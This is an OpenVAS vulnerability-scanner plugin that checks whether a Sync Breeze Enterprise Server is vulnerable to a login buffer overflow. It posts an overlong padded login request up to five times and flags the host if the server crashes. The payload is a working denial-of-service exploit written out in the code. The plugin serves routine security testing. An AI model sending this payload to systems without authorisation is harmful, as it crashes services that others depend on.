##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sync_breeze_enterprise_server_bof_vuln.nasl 12813 2018-12-18 07:43:29Z ckuersteiner $
#
# Sync Breeze Enterprise Server Buffer Overflow Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:flexense:syncbreeze";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809059");
  script_version("$Revision: 12813 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-12-18 08:43:29 +0100 (Tue, 18 Dec 2018) $");
  script_tag(name:"creation_date", value:"2016-10-10 10:19:35 +0530 (Mon, 10 Oct 2016)");
  script_tag(name:"qod_type", value:"remote_vul");

  script_name("Sync Breeze Enterprise Server Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"The host is running Sync Breeze Enterprise
  Server and is prone to buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP POST
  and check whether it is able to crash the server or not.");

  script_tag(name:"insight", value:"The flaw is due to an error when processing
  web requests and can be exploited to cause a buffer overflow via an overly long
  string passed to 'Login' request.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"Sync Breeze Enterprise version 8.9.24");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the product
  by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.syncbreeze.com");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40456");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/138994");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_sync_breeze_enterprise_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("flexsense_syncbreeze/detected", "Host/runs_windows");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(http_is_dead(port:http_port)){
  exit(0);
}

host = http_host_name(port:http_port);

exploit = crap(data: "0x41", length:12292);
PAYLOAD = "username=test" + "&password=test" + "\r\n" + exploit;

sndReq = http_post_req(port:http_port, url:"/login", data:PAYLOAD,
         add_headers: make_array("Content-Type", "application/x-www-form-urlencoded",
         "Origin","http://" + host,"Content-Length", strlen(PAYLOAD)));

##Send Multiple Times , Inconsistency Issue
for (j=0;j<5;j++)
{
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(http_is_dead(port:http_port))
  {
    security_message(http_port);
    exit(0);
  }
}

exit(99);
